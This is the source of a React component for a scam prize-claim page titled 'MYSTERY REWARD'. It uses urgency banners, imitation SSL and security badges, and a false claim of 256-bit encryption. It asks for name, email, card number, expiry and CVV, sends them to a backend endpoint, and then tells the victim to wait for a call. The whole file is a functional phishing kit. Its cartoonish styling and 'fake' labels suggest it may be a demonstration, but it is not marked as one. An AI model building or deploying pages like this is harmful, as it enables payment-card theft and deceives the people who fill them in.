"use client"
import React, { useState } from 'react';

export default function FakeStore() {
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [item, setItem] = useState('');
  const [submitted, setSubmitted] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();

    const transaction = {
      name,
      email,
      cardNumber,
      expiry,
      cvv,
      item,
      timestamp: new Date().toISOString()
    };

    try {
      await fetch('/api/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(transaction)
      });
      setSubmitted(true);
    } catch (err) {
      console.error('Failed to send transaction:', err);
    }
  };

  if (submitted) {
    return (
      <div style={{
        fontFamily: 'Comic Sans MS',
        backgroundColor: '#fffbe6',
        color: '#111',
        textAlign: 'center',
        padding: '3rem',
        border: '5px dotted green'
      }}>
        <h1>🎉 You're almost there!</h1>
        <p>Our team is verifying your details...</p>
        <p style={{ color: 'red', fontWeight: 'bold' }}>✅ Please DO NOT close this page.</p>
        <p>Someone will contact you shortly. Stay alert for a text or call. 📞</p>
        <img src="https://i.imgur.com/ZV7D9VZ.png" alt="fake badge" width="150" />
        <p style={{ fontSize: '0.8rem', marginTop: '2rem' }}>© 2025 GlobalTrust Inc. - All rights reserved</p>
      </div>
    );
  }

  return (
    <div style={{
      fontFamily: 'Comic Sans MS',
      backgroundColor: '#ffeded',
      padding: '3rem',
      border: '6px dashed red',
      maxWidth: '600px',
      margin: '3rem auto',
      boxShadow: '0 0 15px red'
    }}>
      <h1 style={{ color: 'red', fontSize: '2rem', textAlign: 'center' }}>🔥 ACT FAST - PRIZES GOING FAST 🔥</h1>
      <p style={{ textAlign: 'center', color: '#444' }}>You're pre-approved for a <strong>MYSTERY REWARD</strong> 🎁</p>
      <br></br>
      <p style={{ textAlign: 'left', color: '#444' }}><strong>Secure Verification Portal</strong> 🔐</p>

      <form onSubmit={handleSubmit} style={{ marginTop: '2rem' }}>
        <div style={{ marginBottom: '1rem' }}>
          <label>🧑 Full Name:</label><br />
          <input
            required
            value={name}
            onChange={(e) => setName(e.target.value)}
            placeholder="John Doe"
            style={{ padding: '0.5rem', width: '100%' }}
          />
        </div>

        <div style={{ marginBottom: '1rem' }}>
          <label>📧 Email Address:</label><br />
          <input
            required
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="john.doe@example.com"
            style={{ padding: '0.5rem', width: '100%' }}
          />
        </div>

        <div style={{ marginBottom: '1rem' }}>
          <label>💳 Card Number:</label><br />
          <input
            required
            value={cardNumber}
            onChange={(e) => setCardNumber(e.target.value)}
            placeholder="1234 5678 9012 3456"
            style={{ padding: '0.5rem', width: '100%' }}
          />
        </div>

        <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
          <div style={{ flex: 1 }}>
            <label>📅 Expiration:</label><br />
            <input
              required
              value={expiry}
              onChange={(e) => setExpiry(e.target.value)}
              placeholder="MM/YY"
              style={{ padding: '0.5rem', width: '100%' }}
            />
          </div>
          <div style={{ flex: 1 }}>
            <label>🔐 CVV:</label><br />
            <input
              required
              value={cvv}
              onChange={(e) => setCvv(e.target.value)}
              placeholder="123"
              style={{ padding: '0.5rem', width: '100%' }}
            />
          </div>
        </div>

        <div style={{ marginBottom: '1rem' }}>
          <label>🎁 Desired Item:</label><br />
          <input
            required
            value={item}
            onChange={(e) => setItem(e.target.value)}
            placeholder="e.g. MacBook Ultra Pro X"
            style={{ padding: '0.5rem', width: '100%' }}
          />
        </div>

        <button type="submit" style={{
          background: 'lime',
          color: 'black',
          border: '3px solid green',
          padding: '1rem',
          width: '100%',
          fontWeight: 'bold',
          fontSize: '1.2rem',
          cursor: 'pointer'
        }}>
          FINALIZE CLAIM ✅
        </button>
      </form>

      <div style={{ marginTop: '2rem', textAlign: 'center' }}>
        <img src="https://i.imgur.com/1XNj7MP.png" alt="ssl badge" width="120" style={{ margin: '0.5rem' }} />
        <img src="https://i.imgur.com/DWfEjbh.png" alt="secure" width="120" style={{ margin: '0.5rem' }} />
        <p style={{ fontSize: '0.8rem' }}>🔒 Encrypted with 256-bit SSL | Powered by GlobalTrust</p>
      </div>
    </div>
  );
}
